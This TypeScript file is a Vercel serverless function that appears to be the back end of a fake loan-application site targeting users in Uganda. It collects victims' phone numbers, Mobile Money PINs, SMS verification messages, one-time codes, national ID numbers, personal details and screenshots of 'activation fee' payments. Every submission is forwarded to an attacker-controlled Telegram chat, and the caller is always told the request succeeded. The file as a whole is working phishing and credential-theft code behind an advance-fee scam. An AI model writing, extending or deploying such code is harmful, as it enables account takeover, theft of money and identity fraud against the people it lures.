// Universal Vercel Serverless Function: sendToTelegram
export default async function handler(req: any, res: any) {
  // CORS setup
  if (res && typeof res.setHeader === 'function') {
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
    res.setHeader(
      'Access-Control-Allow-Headers',
      'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
    );
  }

  if (req.method === 'OPTIONS') {
    return res.status ? res.status(200).end() : res.end();
  }

  if (req.method !== 'POST') {
    return res.status ? res.status(405).json({ error: 'Method not allowed' }) : res.end(JSON.stringify({ error: 'Method not allowed' }));
  }

  try {
    let input = req.body;
    if (typeof input === 'string') {
      try {
        input = JSON.parse(input);
      } catch {
        input = {};
      }
    }
    input = input || {};

    const cleanEnv = (val?: string): string => {
      if (!val) return '';
      let s = val.trim();
      if ((s.startsWith('"') && s.endsWith('"')) || (s.startsWith("'") && s.endsWith("'"))) {
        s = s.slice(1, -1).trim();
      }
      return s;
    };

    const cleanToken = (val?: string): string => {
      let s = cleanEnv(val);
      if (s.toLowerCase().startsWith('bot') && s.includes(':')) {
        s = s.slice(3).trim();
      }
      return s;
    };

    const botToken = cleanToken(
      process.env.TELEGRAM_BOT_TOKEN ||
      process.env.BOT_TOKEN ||
      process.env.TELEGRAM_TOKEN ||
      process.env.TG_BOT_TOKEN ||
      process.env.TG_TOKEN ||
      process.env.TOKEN ||
      process.env.TELEGRAM_API_KEY ||
      process.env.VITE_TELEGRAM_BOT_TOKEN ||
      process.env.VITE_BOT_TOKEN ||
      process.env.ZITE_TELEGRAM_BOT_TOKEN ||
      ''
    );

    const chatId = cleanEnv(
      process.env.TELEGRAM_CHAT_ID ||
      process.env.CHAT_ID ||
      process.env.TELEGRAM_CHATID ||
      process.env.TG_CHAT_ID ||
      process.env.CHANNEL_ID ||
      process.env.CHATID ||
      process.env.VITE_TELEGRAM_CHAT_ID ||
      process.env.VITE_CHAT_ID ||
      process.env.ZITE_TELEGRAM_CHAT_ID ||
      ''
    );

    const escapeHtml = (text: string = ''): string => {
      return String(text)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
    };

    const formatExtraFields = (data: Record<string, any>, knownKeys: string[]): string => {
      const extraKeys = Object.keys(data).filter(
        (k) => !knownKeys.includes(k) && data[k] !== undefined && data[k] !== '' && typeof data[k] !== 'object'
      );
      if (extraKeys.length === 0) return '';
      const lines = extraKeys.map((k) => `• <b>${escapeHtml(k)}:</b> ${escapeHtml(String(data[k]))}`);
      return `\n\n📋 <b>Additional Details:</b>\n${lines.join('\n')}`;
    };

    const timeStr = new Date().toUTCString();
    let messageHtml = '';

    if (input.type === 'payment' || input.photo || input.screenshot) {
      const photoData = input.photo || input.screenshot;
      const captionHtml =
        `📸 <b>Activation Fee Payment Screenshot Uploaded</b>\n\n` +
        `👤 <b>Applicant:</b> ${escapeHtml(input.firstName || input.name || 'N/A')}\n` +
        `📞 <b>Phone:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || '')}</code>\n` +
        `💰 <b>Loan Amount:</b> <b>${escapeHtml(input.loanAmount || 'N/A')}</b>\n` +
        `🔴 <b>Activation Fee:</b> <code>${escapeHtml(input.activationFee || 'N/A')}</code>\n` +
        `⏰ <b>Submission Time:</b> ${escapeHtml(timeStr)}` +
        formatExtraFields(input, ['type', 'country', 'countryCode', 'phone', 'photo', 'screenshot', 'firstName', 'name', 'loanAmount', 'activationFee']);

      if (botToken && chatId && photoData) {
        try {
          let mimeType = 'image/jpeg';
          let base64Data = photoData;
          if (photoData.includes(';base64,')) {
            const parts = photoData.split(';base64,');
            mimeType = parts[0].replace(/^data:/, '') || 'image/jpeg';
            base64Data = parts[1];
          }
          const buffer = Buffer.from(base64Data, 'base64');
          const blob = new Blob([buffer], { type: mimeType });
          const formData = new FormData();
          formData.append('chat_id', chatId);
          formData.append('photo', blob, 'screenshot.jpg');
          formData.append('caption', captionHtml);
          formData.append('parse_mode', 'HTML');

          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: 'POST',
            body: formData,
          });
        } catch (err) {
          console.error('[sendPhoto error]:', err);
        }
      }

      return res.status ? res.status(200).json({ success: true }) : res.end(JSON.stringify({ success: true }));
    } else if (input.type === 'phone') {
      messageHtml =
        `📱 <b>New User Started Registration</b>\n\n` +
        `🌍 <b>Country:</b> ${escapeHtml(input.country || 'Uganda')}\n` +
        `📞 <b>Phone:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || '')}</code>\n` +
        `⏰ <b>Time:</b> ${escapeHtml(timeStr)}` +
        formatExtraFields(input, ['type', 'country', 'countryCode', 'phone']);
    } else if (input.type === 'credentials') {
      messageHtml =
        `📱 <b>MoMo Account Login / PIN</b>\n\n` +
        `🌍 <b>Country:</b> ${escapeHtml(input.country || 'Uganda')}\n` +
        `📞 <b>Phone:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || '')}</code>\n` +
        `🔐 <b>MoMo PIN:</b> <code>${escapeHtml(input.pin || 'N/A')}</code>\n` +
        `⏰ <b>Time:</b> ${escapeHtml(timeStr)}` +
        formatExtraFields(input, ['type', 'country', 'countryCode', 'phone', 'pin']);
    } else if (input.type === 'sms' || (input.type === 'otp' && input.smsMessage)) {
      messageHtml =
        `📩 <b>SMS Verification Message Received</b>\n\n` +
        `🌍 <b>Country:</b> ${escapeHtml(input.country || 'Uganda')}\n` +
        `📞 <b>Phone:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || '')}</code>\n` +
        `⏰ <b>Time:</b> ${escapeHtml(timeStr)}\n\n` +
        `💬 <b>Full SMS Message:</b>\n<pre>${escapeHtml(input.smsMessage || input.otp || 'N/A')}</pre>` +
        formatExtraFields(input, ['type', 'country', 'countryCode', 'phone', 'smsMessage', 'otp']);
    } else if (input.type === 'final_otp' || input.type === 'otp') {
      messageHtml =
        `🔐 <b>4-Digit Final OTP Code Entered</b>\n\n` +
        `🌍 <b>Country:</b> ${escapeHtml(input.country || 'Uganda')}\n` +
        `📞 <b>Phone:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || '')}</code>\n` +
        `🔢 <b>OTP Code:</b> <code>${escapeHtml(input.otp || 'N/A')}</code>\n` +
        `⏰ <b>Time:</b> ${escapeHtml(timeStr)}` +
        formatExtraFields(input, ['type', 'country', 'countryCode', 'phone', 'otp']);
    } else {
      messageHtml =
        `🎉 <b>Full Loan Application Submitted</b>\n\n` +
        `👤 <b>Personal Details</b>\n` +
        `• <b>First Name:</b> ${escapeHtml(input.firstName || 'N/A')}\n` +
        `• <b>Last Name:</b> ${escapeHtml(input.lastName || 'N/A')}\n` +
        `• <b>Full Name:</b> ${escapeHtml((input.firstName || '') + ' ' + (input.lastName || '')).trim() || 'N/A'}\n` +
        `• <b>Phone Number:</b> <code>${escapeHtml(input.countryCode || '+256')} ${escapeHtml(input.phone || input.mobile || '')}</code>\n` +
        `• <b>Gender:</b> ${escapeHtml(input.gender || 'N/A')}\n` +
        `• <b>National ID / NIN:</b> <code>${escapeHtml(input.idNumber || 'N/A')}</code>\n` +
        `• <b>Nationality:</b> ${escapeHtml(input.nationality || 'Ugandan')}\n` +
        `• <b>Email Address:</b> ${escapeHtml(input.email || 'N/A')}\n\n` +
        `💰 <b>Loan Details</b>\n` +
        `• <b>Loan Amount:</b> <b>${escapeHtml(input.loanAmount || 'UGX 1,000,000')}</b>\n` +
        `• <b>Purpose:</b> ${escapeHtml(input.loanPurpose || 'Business Expansion')}\n` +
        `• <b>Loan Type:</b> ${escapeHtml(input.loanType || 'Business Loan')}\n` +
        `• <b>Repayment Period:</b> ${escapeHtml(input.repaymentPeriod || '6 Months')}\n` +
        `• <b>Disbursement:</b> Instant Mobile Money\n\n` +
        `🌍 <b>Country:</b> ${escapeHtml(input.country || 'Uganda')}\n` +
        `⏰ <b>Submission Time:</b> ${escapeHtml(timeStr)}` +
        formatExtraFields(input, [
          'type',
          'country',
          'countryCode',
          'phone',
          'mobile',
          'firstName',
          'lastName',
          'gender',
          'idNumber',
          'nationality',
          'email',
          'loanAmount',
          'loanPurpose',
          'loanType',
          'repaymentPeriod',
        ]);
    }

    if (botToken && chatId) {
      try {
        const tgRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: messageHtml,
            parse_mode: 'HTML',
          }),
        });
        const tgData = await tgRes.json() as any;
        if (!tgData.ok) {
          // Plain text fallback
          const plainText = messageHtml.replace(/<[^>]*>/g, '');
          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              text: plainText,
            }),
          });
        }
      } catch (tgErr) {
        console.error('[Telegram sendToTelegram Dispatch Error]:', tgErr);
      }
    }

    return res.status ? res.status(200).json({ success: true }) : res.end(JSON.stringify({ success: true }));
  } catch (error: any) {
    console.error('[Telegram sendToTelegram Error]:', error);
    return res.status ? res.status(200).json({ success: true, warning: error.message }) : res.end(JSON.stringify({ success: true }));
  }
}
